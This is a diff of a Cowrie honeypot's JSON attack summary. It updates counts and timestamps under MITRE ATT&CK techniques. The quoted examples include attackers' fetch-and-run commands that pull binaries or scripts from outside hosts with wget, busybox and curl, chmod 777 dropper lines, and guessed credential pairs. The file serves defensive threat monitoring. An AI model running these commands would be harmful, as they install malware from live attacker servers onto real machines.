@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-13 10:01:31",
+  "generated": "2026-08-13 11:00:43",
   "totals": {
-    "commands": 1422,
-    "login_failed": 1488,
-    "login_success": 84,
-    "sessions": 1648
+    "commands": 1453,
+    "login_failed": 1509,
+    "login_success": 87,
+    "sessions": 1673
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1488,
+      "count": 1509,
       "examples": [
         "user1 / 123456",
         "root / 1234567",
@@ -21,14 +21,14 @@
         "user1 / 12345678"
       ],
       "first": "2026-08-13T00:00:04.398982Z",
-      "last": "2026-08-13T09:56:45.705789Z",
-      "unique_ips": 83
+      "last": "2026-08-13T10:51:43.774854Z",
+      "unique_ips": 88
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 297,
+      "count": 312,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-13T00:01:53.648846Z",
-      "last": "2026-08-13T09:05:57.180568Z",
-      "unique_ips": 26
+      "last": "2026-08-13T10:08:41.466548Z",
+      "unique_ips": 27
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 133,
+      "count": 137,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T09:05:57.180568Z",
-      "unique_ips": 26
+      "last": "2026-08-13T10:08:41.466548Z",
+      "unique_ips": 27
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 84,
+      "count": 87,
       "examples": [
         "root / root",
         "root / 123@@@",
@@ -69,21 +69,21 @@
         "orangepi / orangepi"
       ],
       "first": "2026-08-13T00:01:49.585213Z",
-      "last": "2026-08-13T09:43:11.753871Z",
-      "unique_ips": 54
+      "last": "2026-08-13T10:51:48.213725Z",
+      "unique_ips": 57
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 19,
+      "count": 20,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T09:05:20.995420Z",
-      "unique_ips": 19
+      "last": "2026-08-13T10:08:05.388730Z",
+      "unique_ips": 20
     },
     {
       "id": "T1082",
@@ -219,30 +219,38 @@
   "unmapped": [
     [
       "/bin/busybox",
-      763
+      770
     ],
     [
       "shell",
-      28
+      29
     ],
     [
       "sh",
-      28
+      29
     ],
     [
       "system",
-      27
+      28
     ],
     [
       "enable",
-      25
+      26
     ],
     [
       "linuxshell",
-      21
+      22
     ],
     [
       "ping ;sh",
+      21
+    ],
+    [
+      "enablelinuxshell",
+      20
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       20
     ],
     [
@@ -258,16 +266,8 @@
       20
     ],
     [
-      "enablelinuxshell",
-      19
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      19
-    ],
-    [
       "busybox",
-      17
+      18
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
